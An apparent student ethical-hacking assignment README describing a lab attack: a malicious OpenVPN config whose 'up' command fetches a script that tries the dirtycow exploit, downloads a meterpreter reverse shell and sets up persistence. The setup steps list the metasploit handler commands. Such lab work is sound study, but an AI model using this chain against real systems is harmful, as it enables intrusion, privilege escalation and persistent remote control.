# Ethical Hacking Assignment 1

This is a demo of using a malicious openvpn configuration to gain access to a linux system.

In Openvpn configuration files, in the up command, arbitrary code can be run. This is a 'feature' of the software that I will be using maliciously.

When the user runs the program, it opens up an OpenVPN connection to the server. The server has a static IP of 10.8.0.1. The up command downloads the script `script.sh` from this github repository.

## The Script

The script checks if it is running as root. If it isn't, It'll check the linux kernel version. If it is within the range for a working dirtycow exploit, it will download, compile and run the exploit to gain root.

If it is not able to attain root, it will continue on with the program.

It checks whether the `shell.elf` executable already exists in the system. If not, it downloads the meterpreter reverse shell executable `shell.elf` from this repo.

It attempts to persist this shell access through init scripts (WIP)

## Issues faced

For some weird reason, I couldn't access the STDIN of the root shell created by the dirtycow exploit. Thus, privilege escalation has to be done manually from the metasploit shell. However, the dirtycow exploit binary should be in the TMP folder of the system, which can be used to elevate the meterpreter session to root

## Setup

1. Download Kali Linux and set it up as a VM.
2. Follow this (guide)[https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-18-04] to install OpenVPN and get a basic setup running
3. From the VM configuration, create a new private network, (EH Demo). Allow it access to the internet
4. Give the server a memorable static IP.
5. Create a new (Ubuntu 14.04)[http://old-releases.ubuntu.com/releases/14.04.0/] VM. The one I used was (this)[http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04-desktop-amd64.iso]
6. DO NOT UPDATE THE VM
7. In the VM, install openvpn. 
8. Copy over the generated client OpenVPN configuration from `Step 2` into the VM.
9. Rename the file from `client.ovpn` to `client.conf`
10. Move file to openvpn directory `sudo mv client.conf /etc/openvpn/`
10. Start the OpenVPN service with `sudo /etc/init.d/openvpn start`
11. The exploit should start up automatically
12. On the Kali VM, start up metasploit.
13. `use exploit/multi/handler`
14. `set payload linux/x86/meterpreter/reverse_tcp`
14. `set LHOST 10.8.0.1` This is the default Server IP set by OpenVPN
15. `exploit` Now you should have a reverse shell into the victim's PC.
16. To obtain root, cd into tmp directory and run the dirtycow executable. You should now be elevated into root privileges
